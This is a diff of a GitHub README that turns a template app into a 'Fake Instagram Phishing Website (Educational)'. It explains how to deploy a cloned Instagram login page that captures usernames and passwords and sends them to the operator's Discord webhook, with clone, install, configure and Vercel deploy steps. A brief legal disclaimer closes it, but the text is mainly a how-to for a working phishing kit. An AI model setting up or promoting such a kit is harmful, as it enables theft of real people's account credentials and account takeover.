@@ -2,19 +2,66 @@
 <img width="1200" height="475" alt="GHBanner" src="https://github.com/user-attachments/assets/0aa67016-6eaf-458a-adb2-6e31a0763ed6" />
 </div>
 
-# Run and deploy your AI Studio app
+# Fake Instagram Phishing Website (Educational)
 
-This contains everything you need to run your app locally.
+A simple Instagram login clone that captures credentials and sends them to your Discord. Built for testing and learning purposes.
 
-View your app in AI Studio: https://ai.studio/apps/0d971f34-a269-4ada-9ae0-ef76066559e6
+## What it does
 
-## Run Locally
+- Creates a fake Instagram login page that looks legit
+- Grabs the username/password when someone enters it
+- Sends the info to your Discord via webhook
+- Super easy to deploy online
 
-**Prerequisites:**  Node.js
+## How to set it up
 
+### What you need
+- Node.js installed
+- A Discord webhook URL
+- A place to host it (Vercel, etc)
 
-1. Install dependencies:
-   `npm install`
-2. Set the `GEMINI_API_KEY` in [.env.local](.env.local) to your Gemini API key
-3. Run the app:
-   `npm run dev`
+### Steps
+
+1. Clone this repo:
+   ```bash
+   git clone https://github.com/nimalanrao/funny-instagram.git
+   cd funny-instagram
+   ```
+
+2. Install stuff:
+   ```bash
+   npm install
+   ```
+
+3. Create `.env.local` and add your Discord webhook:
+   ```
+   DISCORD_WEBHOOK_URL=your_webhook_url_here
+   ```
+
+4. Test locally:
+   ```bash
+   npm run dev
+   ```
+
+5. Deploy to Vercel:
+   ```bash
+   vercel deploy
+   ```
+
+## Sample Images
+
+### Discord Message Webhook
+Add here your sample image showing what the Discord message looks like when credentials are captured:
+```
+[Screenshot of Discord webhook message with captured credentials]
+```
+
+### Landing Page
+Add here your sample image of the fake Instagram login page:
+```
+[Screenshot of the fake Instagram landing page]
+```
+
+## Important Legal Stuff
+
+**Only use this on systems you own or have permission to test.** This is for educational purposes only. Using this without permission is illegal and can get you in serious trouble. Be smart about it.
